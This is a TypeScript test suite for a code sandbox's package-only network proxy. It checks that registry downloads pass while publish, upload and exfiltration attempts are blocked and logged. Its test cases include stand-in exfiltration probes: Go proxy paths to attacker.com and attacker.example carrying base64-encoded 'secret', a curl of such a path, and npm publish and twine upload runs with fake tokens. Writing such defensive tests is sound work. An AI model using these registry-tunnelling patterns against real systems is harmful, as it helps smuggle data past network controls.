import { describe, expect, it } from 'vitest';
import fs from 'node:fs';
import net from 'node:net';
import tls from 'node:tls';
import path from 'node:path';
import dns from 'node:dns/promises';
import { execFileSync } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import { tmpData } from './helpers';

const dir = tmpData();
process.env.KORVEX_CODE_NET = 'packages';
const ONLINE = process.env.KX_TEST_NET === 'live' && await dns.lookup('pypi.org').then(() => true).catch(() => false);
let DOCKER = false;
try { execFileSync('docker', ['image', 'inspect', 'korvex-code:1'], { stdio: 'ignore' }); DOCKER = true; } catch {  }

async function viaProxy(sock: string, host: string, method: string, p: string, ca: string): Promise<{ connect: string; status?: number }> {
  const c = net.connect(sock);
  await new Promise((r) => c.once('connect', r));
  c.write(`CONNECT ${host}:443 HTTP/1.1\r\nHost: ${host}:443\r\n\r\n`);
  const head = await new Promise<string>((resolve) => { let b = ''; const f = (d: Buffer) => { b += d.toString('latin1'); if (b.includes('\r\n\r\n')) { c.off('data', f); resolve(b); } }; c.on('data', f); c.on('close', () => resolve(b)); });
  const connect = head.split('\r\n')[0];
  if (!/ 200 /.test(connect)) { c.destroy(); return { connect }; }
  const t = tls.connect({ socket: c, servername: host, ca, ALPNProtocols: ['http/1.1'] });
  await new Promise<void>((resolve, reject) => { t.once('secureConnect', () => resolve()); t.once('error', reject); });
  t.write(`${method} ${p} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: korvex-test\r\nAccept: */*\r\nConnection: close\r\n${method === 'GET' || method === 'HEAD' ? '' : 'Content-Type: application/json\r\nContent-Length: 2\r\n'}\r\n${method === 'GET' || method === 'HEAD' ? '' : '{}'}`);
  const resp = await new Promise<string>((resolve) => { let b = ''; t.on('data', (d: Buffer) => { b += d.toString('latin1'); if (b.length > 2000) { t.destroy(); resolve(b); } }); t.on('close', () => resolve(b)); t.on('error', () => resolve(b)); });
  return { connect, status: Number(resp.match(/^HTTP\/1\.1 (\d{3})/)?.[1] ?? 0) };
}

describe('прокси песочницы: пути только похожие на скачивание пакета', () => {
  it('шаблоны путей и пределы длины', async () => {
    const n = await import('@/lib/code/netproxy');
    const ok = (h: string, p: string) => n.pathAllowed(h, p).ok;
    expect(ok('pypi.org', '/simple/requests/')).toBe(true);
    expect(ok('pypi.org', '/pypi/pip/json')).toBe(true);
    expect(ok('files.pythonhosted.org', '/packages/d9/5a/e7c31adbe875f2abbb91bd84cf2dc52d792b5a01506781dbcf25c91daf11/six-1.16.0-py2.py3-none-any.whl')).toBe(true);
    expect(ok('registry.npmjs.org', '/is-number')).toBe(true);
    expect(ok('registry.npmjs.org', '/@types%2fnode')).toBe(true);
    expect(ok('registry.npmjs.org', '/@types/node/-/node-20.11.0.tgz')).toBe(true);
    expect(ok('proxy.golang.org', '/github.com/google/uuid/@v/list')).toBe(true);
    expect(ok('proxy.golang.org', '/golang.org/x/text/@v/v0.14.0.zip')).toBe(true);
    expect(ok('sum.golang.org', '/lookup/github.com/google/uuid@v1.6.0')).toBe(true);
    expect(ok('static.crates.io', '/crates/serde/serde-1.0.195.crate')).toBe(true);
    expect(ok('proxy.golang.org', '/attacker.com/c2VjcmV0/@v/list')).toBe(false);
    expect(ok('proxy.golang.org', '/attacker.com/x/@latest')).toBe(false);
    expect(ok('sum.golang.org', '/lookup/attacker.com/data@v1.0.0')).toBe(false);
    expect(ok('registry.npmjs.org', '/is-number?d=' + 'A'.repeat(300))).toBe(false);
    expect(ok('registry.npmjs.org', '/' + 'a'.repeat(450))).toBe(false);
    expect(ok('pypi.org', '/simple/requests/../../x')).toBe(false);
    expect(ok('pypi.org', '/search/?q=secret')).toBe(false);
    expect(ok('registry.npmjs.org', '/-/whoami')).toBe(false);
    expect(n.hostAllowed('storage.googleapis.com', 'packages')).toBe(false);
    expect(n.hostAllowed('conda.anaconda.org', 'packages')).toBe(false);
  });
});

describe.skipIf(!ONLINE)('прокси песочницы: только скачивание', () => {
  it('GET/HEAD к реестру — да; POST/PUT/DELETE — 403; хосты выгрузки — 403; ключ CA не в каталоге песочницы; всё в журнале', async () => {
    const n = await import('@/lib/code/netproxy');
    const sock = n.ensureNetProxy()!;
    await new Promise((r) => setTimeout(r, 50));
    const caPub = path.join(n.sockDir(), 'ca.crt');
    expect(fs.existsSync(caPub)).toBe(true);
    expect(fs.readdirSync(n.sockDir()).some((f) => f.endsWith('.key'))).toBe(false);
    const ca = fs.readFileSync(caPub, 'utf8');
    expect((await viaProxy(sock, 'pypi.org', 'GET', '/simple/six/', ca)).status).toBe(200);
    expect((await viaProxy(sock, 'pypi.org', 'HEAD', '/simple/six/', ca)).status).toBe(200);
    expect((await viaProxy(sock, 'registry.npmjs.org', 'PUT', '/korvex-exfil-test', ca)).status).toBe(403);
    expect((await viaProxy(sock, 'pypi.org', 'POST', '/legacy/', ca)).status).toBe(403);
    expect((await viaProxy(sock, 'registry.npmjs.org', 'DELETE', '/korvex-exfil-test/-rev/1', ca)).status).toBe(403);
    for (const h of ['upload.pypi.org', 'test.pypi.org', 'github.com', 'api.github.com', 'storage.googleapis.com']) expect((await viaProxy(sock, h, 'GET', '/', ca)).connect, h).toMatch(/ 403 /);
    expect((await viaProxy(sock, 'proxy.golang.org', 'GET', '/attacker.example/exfil-c2VjcmV0/@v/list', ca)).status).toBe(403);
    expect((await viaProxy(sock, 'proxy.golang.org', 'GET', '/github.com/google/uuid/@v/list', ca)).status).toBe(200);
    expect(n.netEvents().some((e) => e.verdict === 'denied-path' && e.host === 'proxy.golang.org' && e.path.includes('attacker.example'))).toBe(true);
    const ev = n.netEvents();
    expect(ev.some((e) => e.verdict === 'denied-method' && e.method === 'PUT' && e.host === 'registry.npmjs.org')).toBe(true);
    expect(ev.some((e) => e.verdict === 'denied-method' && e.method === 'POST' && e.host === 'pypi.org')).toBe(true);
    expect(ev.some((e) => e.verdict === 'denied-host' && e.host === 'upload.pypi.org')).toBe(true);
  }, 60_000);

  it.skipIf(!DOCKER)('в песочнице: pip download и npm install работают; npm publish и twine upload — отказ прокси', async () => {
    const { runInBox, stopBox } = await import('@/lib/code/sandbox');
    const n = await import('@/lib/code/netproxy');
    const wt = path.join(dir, 'wt-net'); fs.mkdirSync(wt, { recursive: true });
    fs.writeFileSync(path.join(wt, 'package.json'), JSON.stringify({ name: 'korvex-exfil-probe-' + randomUUID().slice(0, 8), version: '0.0.1', description: 'test', license: 'MIT' }));
    const th = randomUUID();
    try {
      const dl = await runInBox(th, wt, 'pip download --no-deps -q -d /tmp/dl six && ls /tmp/dl && npm install --no-save --ignore-scripts is-number@7.0.0 >/dev/null 2>&1 && ls node_modules', { timeoutS: 240 });
      expect(dl.out).toMatch(/six-.*\.whl/);
      expect(dl.out).toContain('is-number');
      const go = await runInBox(th, wt, "curl -s -o /dev/null -w 'go-ok %{http_code}\\n' https://proxy.golang.org/github.com/google/uuid/@v/v1.6.0.mod; curl -s -o /dev/null -w 'go-exfil %{http_code}\\n' https://proxy.golang.org/attacker.example/c2VjcmV0/@v/list", { timeoutS: 60 });
      expect(go.out).toContain('go-ok 200');
      expect(go.out).toContain('go-exfil 403');
      const before = n.netEvents().length;
      const pub = await runInBox(th, wt, 'npm publish --registry https://registry.npmjs.org/ --//registry.npmjs.org/:_authToken=npm_FAKEFAKEFAKEFAKE 2>&1 | tail -5; echo "exit=${PIPESTATUS[0]}"', { timeoutS: 120 });
      expect(pub.out).toMatch(/403|E403|Forbidden/i);
      expect(pub.out).not.toMatch(/exit=0/);
      const tw = await runInBox(th, wt, [
        'pip install -q twine >/dev/null 2>&1 || echo "twine-install-failed"',
        'mkdir -p /tmp/pkg && cd /tmp/pkg && printf "Metadata-Version: 2.1\\nName: korvex-exfil-probe\\nVersion: 0.0.1\\n" > PKG-INFO',
        'python3 -c "import zipfile;z=zipfile.ZipFile(\'/tmp/pkg/korvex_exfil_probe-0.0.1-py3-none-any.whl\',\'w\');z.writestr(\'korvex_exfil_probe-0.0.1.dist-info/METADATA\',\'Metadata-Version: 2.1\\nName: korvex-exfil-probe\\nVersion: 0.0.1\\n\');z.writestr(\'korvex_exfil_probe-0.0.1.dist-info/WHEEL\',\'Wheel-Version: 1.0\\nGenerator: x\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\');z.writestr(\'korvex_exfil_probe-0.0.1.dist-info/RECORD\',\'\');z.close()"',
        'TWINE_USERNAME=__token__ TWINE_PASSWORD=pypi-FAKE python3 -m twine upload --non-interactive --disable-progress-bar /tmp/pkg/*.whl 2>&1 | tail -4; echo "exit=${PIPESTATUS[0]}"',
      ].join('; '), { timeoutS: 240 });
      expect(tw.out).not.toContain('twine-install-failed');
      expect(tw.out).not.toMatch(/exit=0/);
      const ev = n.netEvents().slice(before);
      expect(ev.some((e) => e.host === 'registry.npmjs.org' && e.method === 'PUT')).toBe(true);
      expect(ev.some((e) => e.host === 'upload.pypi.org')).toBe(true);
      console.log('журнал прокси:', ev.map((e) => `${e.verdict} ${e.method} ${e.host}${e.path}`).join(' | '));
    } finally { await stopBox(th); }
  }, 600_000);
});
